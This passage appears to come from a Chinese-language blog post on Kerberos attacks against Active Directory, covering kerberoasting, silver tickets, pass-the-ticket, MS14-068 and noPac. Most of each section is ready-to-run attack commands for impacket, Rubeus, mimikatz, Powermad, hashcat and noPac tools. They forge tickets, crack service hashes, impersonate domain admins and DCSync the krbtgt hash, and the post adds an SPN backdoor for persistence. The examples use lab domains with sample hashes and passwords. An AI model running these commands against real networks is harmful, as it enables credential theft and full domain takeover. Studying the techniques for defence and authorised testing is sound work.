PTT横向</span><br><span class="line">python3 secretsdump.py dc1.test.com -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p>user-id 和 groups-ids 是为了应对某些特殊情况：默认情况下，impacket和mimikatz伪造的票证包含 PAC，表明用户属于某些知名管理员组（即组 ID 513、512、520、518、519），在某些情况下，这些组是不够的（即使是域管理员也没有本地管理员权限的特殊机器）</p>
+<p><strong>4. Metasploit</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;escalate&#x2F;golden_ticket</span><br><span class="line">auxiliary&#x2F;admin&#x2F;kerberos&#x2F;forge_ticket</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h1><h2 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h2><p>攻击原理：在TGS_REQ中的sname是要请求的服务SPN，如果发送的TGT正确，在TGS_REP阶段 <strong>返回由SPN服务对应账号hash加密的ST，此时可以导出该ST进行本地破解逆推出SPN服务对应的账户hash</strong></p>
+<hr>
+<p>SPN（ServicePrincipal Names - 服务主体名称）是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，存在于账号的属性中</p>
+<p>SPN分为两种：</p>
+<ul>
+<li>注册在 <strong>AD上机器帐户(Computers)</strong> ：当一个服务的权限为 <code>Local System</code> 或 <code>Network Service</code></li>
+<li>注册在 <strong>域用户帐户(Users)</strong> ：当一个服务的权限为一个域用户</li>
+</ul>
+<p>域内主要账号类型：</p>
+<ul>
+<li><p>用户账户（User Accounts）</p>
+<ul>
+<li>用途：供个人用户登录域、访问资源</li>
+<li>示例：<a href="mailto:&#x7a;&#104;&#97;&#x6e;&#103;&#x73;&#97;&#110;&#x40;&#100;&#111;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;">&#x7a;&#104;&#97;&#x6e;&#103;&#x73;&#97;&#110;&#x40;&#100;&#111;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#x6f;&#109;</a>、Administrator</li>
+<li>特点：<ul>
+<li>密码由用户设置或管理员分配，可能绑定邮箱、权限组等</li>
+<li>可手动关联SPN（此时称为 <code>服务用户账户</code>）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>计算机账户（Computer Accounts）</p>
+<ul>
+<li><p>用途：代表 加入域的计算机或服务器，用于身份验证和资源访问</p>
+</li>
+<li><p>示例：DC01$、SQLSERVER$（以$结尾）</p>
+</li>
+<li><p>特点：</p>
+<ul>
+<li>密码由系统自动管理（定期更新），安全性较高</li>
+<li>自动注册SPN（如 HOST/DC01.domain.com、MSSQLSvc/sqlserver.domain.com:1433、TERMSRV/rdp-server.domain.com）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>服务账户（Service Accounts）</p>
+<ul>
+<li><p>技术本质：并非独立账号类型，而是用户账户或计算机账户的一种用途。</p>
+</li>
+<li><p>分类：</p>
+<ul>
+<li>普通用户账户：手动配置为服务运行身份（如svc_sql），需关联SPN，密码人工维护（易成Kerberoasting攻击目标）</li>
+<li>组托管服务账户（gMSA）：专用服务账户类型，密码由AD自动管理（Windows Server 2012+），安全性更高</li>
+<li>计算机账户：服务以SYSTEM或Network Service运行时，隐式使用计算机账户身份</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>攻击步骤：</strong></p>
+<p>一、收集域内高价值SPN：1. 注册在域用户帐户(Users)下。2. 该域用户账户的权限高</p>
+<p>二、请求指定TGS</p>
+<p>三、导出TGS</p>
+<p>四、本地破解</p>
+<p>本地测试为域用户Bob添加一个SPN属性</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250216000120178.png" alt="image-20250216000120178"></p>
+<p><strong>工具：</strong></p>
+<p><strong>1. impacket</strong></p>
+<p>GetUserSPNs可以实现自动化查询、请求TGS</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 只查询SPN</span><br><span class="line">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128</span><br><span class="line"># 导出指定用户TGS</span><br><span class="line">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128 -request-user Bob</span><br><span class="line"># 导出所有用户TGS</span><br><span class="line">python GetUserSPNs.py test.com&#x2F;tom:Ab123456 -dc-ip 192.168.100.128 -request</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250216001108155.png" alt="image-20250216001108155"></p>
+<p><strong>2. Rubeus</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe kerberoast &#x2F;nowrap &#x2F;format:hashcat</span><br></pre></td></tr></table></figure>
+
+<p>如果在未禁用RC4情况下启用了AES加密，即msDS-SupportedEncryptionTypes属性被设置了AES，当kerberoast时，返回的票据为AES加密，这时添加 <code>/tgtdeleg</code> 参数可以实现加密类型的降级，强迫返回票据使用RC4进行加密</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe kerberoast &#x2F;tgtdeleg &#x2F;nowrap &#x2F;format:hashcat</span><br></pre></td></tr></table></figure>
+
+<p><strong>John、hashcat</strong></p>
+<p>本地破解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 1.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><strong>后门利用</strong></p>
+<p>在取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令，例如为域用户Administrator添加SPNVNC/DC1.test.com：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -U -A SPNVNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>攻击原理：在TGS_REP阶段返回使用服务账户hash加密的TGS票据，如果有了服务账户的hash，可以<strong>直接伪造TGS票据从而直接访问该指定的服务</strong>，用作一种权限维持手法，注意的是银票只能访问特定的服务</p>
+<hr>
+<p><strong>白银票据特点：</strong></p>
+<ul>
+<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
+<li>任何事件日志都在目标服务器上</li>
+</ul>
+<p><strong>制作银票条件：</strong></p>
+<ul>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域中的Server服务器账户的 NTLM Hash 或 AES-256 或 AES-128</li>
+<li>伪造的任意用户名</li>
+<li>目标服务器上面的kerberos服务名</li>
+</ul>
+<p><strong>常见的服务：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                      HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share         CIFS</span><br><span class="line">LDAP  DCSync               LDAP</span><br><span class="line">Windows Remote Server      RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>攻击步骤：</strong></p>
+<p>一、获取所需条件信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域名：test.com</span><br><span class="line">域SID：S-1-5-21-3222783777-1006235836-3661351843</span><br><span class="line">服务器账户：域控的机器账户：DC-1$</span><br><span class="line">hash：43659c20b609efca43cecfe5e04fea8b</span><br><span class="line">伪造的任意用户名：Administrator</span><br><span class="line">服务名：CIFS</span><br></pre></td></tr></table></figure>
+
+<p>二、工具</p>
+<p><strong>1. Mimikatz</strong></p>
+<p>CIFS服务为远程文件服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:test.com &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;target:DC-1.test.com &#x2F;service:cifs &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;user:silver &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250217075544211.png" alt="image-20250217075544211"></p>
+<p>LDAP服务可远程dcsync</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:t &#x2F;domain:test.com &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;target:DC-1.test.com &#x2F;service:ldap &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;user:DCsync &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;dc:DC-1 &#x2F;domain:test.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250217081303883.png" alt="image-20250217081303883"></p>
+<p><strong>2. Rubeus</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rubeus.exe silver &#x2F;service:MSSQLSvc&#x2F;MSSQL.test.com &#x2F;rc4:43659c20b609efca43cecfe5e04fea8b &#x2F;sid:S-1-5-21-3222783777-1006235836-3661351843 &#x2F;user:mssql &#x2F;domain:test.com &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="金-银票对比"><a href="#金-银票对比" class="headerlink" title="金/银票对比"></a>金/银票对比</h1><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>黄金票据</th>
+<th>白银票据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>作用对象</td>
+<td>伪造TGT（Ticket Granting Ticket）</td>
+<td>伪造特定服务的ST（Service Ticket）</td>
+</tr>
+<tr>
+<td>依赖凭据</td>
+<td>KRBTGT账户的哈希</td>
+<td>服务账户（如机器账户）的哈希</td>
+</tr>
+<tr>
+<td>权限范围</td>
+<td>可访问域内所有服务</td>
+<td>仅能访问特定服务（如CIFS、LDAP等）</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>需与KDC交互获取服务票据，可能触发日志</td>
+<td>无需与KDC交互，更隐蔽</td>
+</tr>
+<tr>
+<td>后门持久性</td>
+<td>长期有效（直到KRBTGT密码重置）</td>
+<td>有效期受服务账户密码（如机器账户30天重置）影响</td>
+</tr>
+</tbody></table>
+<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>攻击原理：在kerberos认证中，除了AS_ERQ外其余步骤都是利用票据进行身份验证，因此利用票据（TGT、TGS）的导出/导入/注入/横向移动都叫 PTT</p>
+<p><strong>工具：</strong></p>
+<p><strong>1. mimikatz</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">klist			查看内存中票据</span><br><span class="line">klist purge  	清除票据</span><br><span class="line"></span><br><span class="line">mimikatz：</span><br><span class="line">kerberos::purge  &#x2F;&#x2F; 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">kerberos::list   &#x2F;&#x2F; 查看当前机器凭证</span><br><span class="line">sekurlsa::tickets &#x2F;export	&#x2F;&#x2F; 导出内存票据</span><br><span class="line">kerberos::ptc $ticket.ccache   &#x2F;&#x2F; 将ccache票据注入到内存中</span><br><span class="line">kerberos::ptt $ticket.kirbi   &#x2F;&#x2F; 将kirbi格式票据注入到内存中</span><br><span class="line"></span><br><span class="line">getTGT.py test.com&#x2F;administrator:Abc@123.. &#x2F;&#x2F; 生成administrator的TGT票据</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. Rubeus</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt &#x2F;ticket:&quot;base64 | file.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>UNIX &lt;-&gt; Windows的票据转换</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows -&gt; UNIX</span><br><span class="line">ticketConverter.py $ticket.kirbi $ticket.ccache</span><br><span class="line"></span><br><span class="line"># UNIX -&gt; Windows</span><br><span class="line">ticketConverter.py $ticket.ccache $ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><h2 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h2><p>域内提权漏洞，允许远程经过身份验证的域用户通过票证中的伪造签名获取域管理员权限，影响 Windows Server 2003 ~ Windows Server 2012 R2。</p>
+<p>大概原理：</p>
+<ul>
+<li>作为标准用户请求不带 PAC 的 Kerberos TGT 身份验证票证，DC 使用 TGT 回复（没有 PAC，通常包含组成员身份，这种情况很不寻常）</li>
+<li>生成一个伪造的 PAC，没有密钥，因此生成的 PAC 使用域用户的密码数据通过 MD5 算法而不是 HMAC_MD5 进行 “签名”</li>
+<li>将无 PAC 的 TGT 与伪造的 PAC 一起作为授权数据 (Authorization-Data) 作为 TGS 服务票证请求的一部分发送到 DC</li>
+<li>DC 似乎对此感到困惑，因此它丢弃用户发送的没有 PAC 的 TGT，创建一个新的 TGT 并将伪造的 PAC 插入到自己的授权数据 (Authorization-Data) 中，然后将此 TGT 发送给用户</li>
+<li>此带有伪造 PAC 的 TGT 使用户能够成为易受攻击的 DC 上的域管理员</li>
+</ul>
+<p>补丁号: KB3011780</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo |findstr &quot;KB3011780&quot;</span><br><span class="line"></span><br><span class="line">wmic qfe GET hotfixid |findstr &quot;KB3011780&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>工具：</strong></p>
+<p><strong>1. impacket</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goldenPac.py &quot;$DOMAIN_FQDN&quot;&#x2F;&quot;$USER&quot;:&quot;$PASSWORD&quot;@&quot;$DC_HOST&quot; -dc-ip &quot;$DC_IP&quot;</span><br><span class="line">python goldenPac.py test.com&#x2F;Bob:Ab123456@DC-1.test.com -dc-ip 192.168.100.128 -debug</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. pykek</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:test.com &#x2F;user:Bob &#x2F;password:Ab123456 &#x2F;ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="noPAC"><a href="#noPAC" class="headerlink" title="noPAC"></a>noPAC</h2><p>域内提权漏洞：利用两个CVE漏洞组合在S4U的条件下会生成一个高权限PAC到ST中。</p>
+<ul>
+<li><p>CVE-2021-42278，机器账户应该以$结尾，但AD没有对域内机器账户名做验证</p>
+</li>
+<li><p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后 <strong>通过S4U2self</strong> 申请TGS Ticket，然后DC进行在TGS_REP阶段加密TGS Ticket时，无法找到该账户利用机器账户hash加密，会在 sAMAccountName 结尾加入 $ 继续查询，此时寻找到了DC$机器账户，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
+</li>
+</ul>
+<p><strong>ms-ds-machineaccountquota（MAQ）：允许用户在域中创建的计算机帐户数，默认为10</strong></p>
+<p><strong>sAMAccountName：域名\用户名</strong></p>
+<hr>
+<p>攻击流程：</p>
+<ul>
+<li><p>创建一个机器账户</p>
+</li>
+<li><p>清除机器账户的SPN（servicePrincipalName）属性。使用 <strong>impacket 或 powermad</strong> 是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以不用清除</p>
+</li>
+<li><p>将机器账户的 <strong>sAMAccountName</strong>，更改为DC的机器账户名字，注意后缀不带$</p>
+</li>
+<li><p>为机器账户请求TGT</p>
+</li>
+<li><p>将创建的机器账户的 <strong>sAMAccountName</strong> 更改为其他名字</p>
+</li>
+<li><p>通过 <strong>S4U2self</strong> 协议向DC请求ST</p>
+</li>
+<li><p>DCsync</p>
+</li>
+</ul>
+<p><strong>检测工具：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">noPac.exe scan -domain redteam.red -user saul -pass &#39;Red12345&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.10.10 -u &#39;&#39; -p &#39;&#39; -d domain -M nopac</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb &lt;ip&gt; -u &#39;user&#39; -p &#39;pass&#39; -M nopac</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用工具：</strong></p>
+<p><strong>1. Powermad</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># test.com是域名 , DC-1是DC的机器名称</span><br><span class="line"># nopac是新建的机器名 , 1qaz@WSX是新建的机器用户的密码</span><br><span class="line"># Base64 TGT是Rubeus.exe获取的TGT结果</span><br><span class="line"></span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line"></span><br><span class="line"># 创建机器用户</span><br><span class="line">$password &#x3D; ConvertTo-SecureString &#39;1qaz@WSX&#39; -AsPlainText -Force</span><br><span class="line">New-MachineAccount -MachineAccount &quot;nopac&quot; -Password $($password) -Domain &quot;test.com&quot; -DomainController &quot;DC-1.test.com&quot; -Verbose</span><br><span class="line"></span><br><span class="line"># 清除机器用户的SPN</span><br><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN&#x3D;nopac,CN&#x3D;Computers,DC&#x3D;hacker,DC&#x3D;lab&quot; -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class="line"></span><br><span class="line"># 将机器用户名修改为DC的用户名。注意不带$符号</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount &quot;nopac&quot; -Value &quot;DC-1&quot; -Attribute samaccountname -Verbose</span><br><span class="line"></span><br><span class="line"># 查看机器用户名是否修改成功</span><br><span class="line">Get-DomainObject &quot;CN&#x3D;nopac,CN&#x3D;Computers,DC&#x3D;hacker,DC&#x3D;lab&quot;</span><br><span class="line"></span><br><span class="line"># 使用Rubeus用机器账号向DC请求TGT</span><br><span class="line">Rubeus.exe asktgt &#x2F;user:&quot;DC-1&quot; &#x2F;password:&quot;1qaz@WSX&quot; &#x2F;domain:&quot;test.com&quot; &#x2F;dc:&quot;DC-1.test.com&quot; &#x2F;nowrap</span><br><span class="line"></span><br><span class="line"># 将机器用户名重置为原来的用户名</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount &quot;nopac&quot; -Value &quot;nopac&quot; -Attribute samaccountname -Verbose</span><br><span class="line"></span><br><span class="line"># 使用请求的TGT通过S4U2self获取ST 注意，impersonateuser必须要存在才有效，如果域内administrator被禁用，换成其他域管</span><br><span class="line">Rubeus.exe s4u &#x2F;self &#x2F;impersonateuser:&quot;administrator&quot; &#x2F;altservice:&quot;ldap&#x2F;DC-1.test.com&quot; &#x2F;dc:&quot;DC-1.test.com&quot; &#x2F;ptt &#x2F;ticket:[Base64 TGT]</span><br><span class="line"></span><br><span class="line"># 可选命令，查看获取的ST</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># 使用Mimikatz进行Dcsync</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;kdc:DC-1.test.com &#x2F;user:krbtgt&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"># 可选命令，清除所有的ST</span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. impacket</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 0. create a computer account</span><br><span class="line">addcomputer.py -computer-name &#39;ControlledComputer$&#39; -computer-pass &#39;ComputerPassword&#39; -dc-host DC01 -domain-netbios domain &#39;domain.local&#x2F;user1:complexpassword&#39;</span><br><span class="line"></span><br><span class="line"># 1. clear its SPNs</span><br><span class="line">addspn.py --clear -t &#39;ControlledComputer$&#39; -u &#39;domain\user&#39; -p &#39;password&#39; &#39;DomainController.domain.local&#39;</span><br><span class="line"></span><br><span class="line"># 2. rename the computer (computer -&gt; DC)</span><br><span class="line">renameMachine.py -current-name &#39;ControlledComputer$&#39; -new-name &#39;DomainController&#39; -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;user&#39;:&#39;password&#39;</span><br><span class="line"></span><br><span class="line"># 3. obtain a TGT</span><br><span class="line">getTGT.py -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;DomainController&#39;:&#39;ComputerPassword&#39;</span><br><span class="line"></span><br><span class="line"># 4. reset the computer name</span><br><span class="line">renameMachine.py -current-name &#39;DomainController&#39; -new-name &#39;ControlledComputer$&#39; &#39;domain.local&#39;&#x2F;&#39;user&#39;:&#39;password&#39;</span><br><span class="line"></span><br><span class="line"># 5. obtain a service ticket with S4U2self by presenting the previous TGT</span><br><span class="line">KRB5CCNAME&#x3D;&#39;DomainController.ccache&#39; </span><br><span class="line">getST.py -self -impersonate &#39;DomainAdmin&#39; -altservice &#39;cifs&#x2F;DomainController.domain.local&#39; -k -no-pass -dc-ip &#39;DomainController.domain.local&#39; &#39;domain.local&#39;&#x2F;&#39;DomainController&#39;</span><br><span class="line"></span><br><span class="line"># 6. DCSync by presenting the service ticket</span><br><span class="line">KRB5CCNAME&#x3D;&#39;DomainAdmin.ccache&#39; </span><br><span class="line">secretsdump.py -just-dc-user &#39;krbtgt&#39; -k -no-pass -dc-ip &#39;DomainController.domain.local&#39; @&#39;DomainController.domain.local&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. noPac.exe</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TryA9ain/noPac">https://github.com/TryA9ain/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/safebuffer/sam-the-admin">https://github.com/safebuffer/sam-the-admin</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用指定的用户密码扫描域内是否存在能利用该漏洞的DC</span><br><span class="line">noPac.exe scan -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot;</span><br><span class="line"></span><br><span class="line"># 使用一键化工具获得域控cifs的权限</span><br><span class="line">noPac.exe -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot; &#x2F;dc DC-1.test.com &#x2F;mAccount nopac1 &#x2F;mPassword 1qaz@WSX &#x2F;service cifs &#x2F;ptt</span><br><span class="line"></span><br><span class="line"># 使用一键化工具获得域控ldap服务的权限，同样此处的impersonate和手动利用方式一致，需要该用户可用</span><br><span class="line">noPac.exe -domain test.com -user &quot;Bob&quot; -pass &quot;Ab123456&quot; &#x2F;dc DC-1.test.com &#x2F;mAccount nopac2 &#x2F;mPassword 1qaz@WSX &#x2F;service ldap &#x2F;ptt &#x2F;impersonate Administrator</span><br><span class="line"></span><br><span class="line"># 使用dcsync导出域内krbtgt密码</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;user:krbtgt &#x2F;csv&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">python noPac.py &#39;domain.local&#x2F;user&#39; -hashes &#39;:31d6cfe0d16ae931b73c59d7e0c089c0&#39; -dc-ip 10.10.10.10 -use-ldap -dump</span><br><span class="line"></span><br><span class="line">python3 sam_the_admin.py &quot;domain&#x2F;user:password&quot; -dc-ip 10.10.10.10 -shell</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>在MAQ = 0 时便不能创建计算机帐户的突破：</strong></p>
+<ul>
+<li><p>拿到 <strong>将计算机拉入域中的帐户</strong> 的权限：将计算机拉入域中的帐户默认对该计算机帐户有 WriteProperty 权限, 计算机帐户中的 mS-DS-CreatorSID 这个属性的 SID 就是拉它入域的 <strong>用户 SID</strong>, 那么便可以去 <strong>查找域内存在 mS-DS-CreatorSID 的计算机帐户, 然后对应找到域用户帐户, 再拿到其域用户帐户权限</strong> 后便可修改对应的计算机帐户属性, 从而实现该漏洞的利用</p>
+</li>
+<li><p>拿到具有 <strong>SeMachineAccountPrivilege</strong> 权限的帐户：有的企业会设置专门用来 <strong>加入域的组</strong> (这个组中的这些帐户都能用来将计算机拉入域中) 或者 <strong>帐户</strong>, 这些帐户具有 SeMachineAccountPrivilege 权限 (“将工作站添加到域” 属性), 后续可以重点留意下这些帐户, 默认 Authenticater Users (身份验证的用户) 具备 SeMachineAccountPrivilege</p>
+</li>
+</ul>
+<p>具体利用参看：<a target="_blank" rel="noopener" href="https://trya9ain.github.io/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4">noPac MAQ = 0 的突破</a></p>
+<hr>
+<p>原理分析文章：</p>
+<p><a target="_blank" rel="noopener" href="https://killer.wtf/2021/12/24/Analyse-NoPac.html">解析CVE-2021-42278和CVE-2021-42287</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA">从XP源码泄露看nopac漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://antipassion.github.io/2022/03/01/CVE-2021-42287-CVE-2021-42278%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">CVE-2021-42287/CVE-2021-42278分析复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://trya9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/">noPac 分析</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/11/Kerberos%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/" rel="prev" title="Kerberos Attacks - Kerberos协议简析">
+                  <i class="fa fa-angle-left"></i> Kerberos Attacks - Kerberos协议简析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" rel="next" title="Kerberos Attacks - 委派的原理与利用">
+                  Kerberos Attacks - 委派的原理与利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
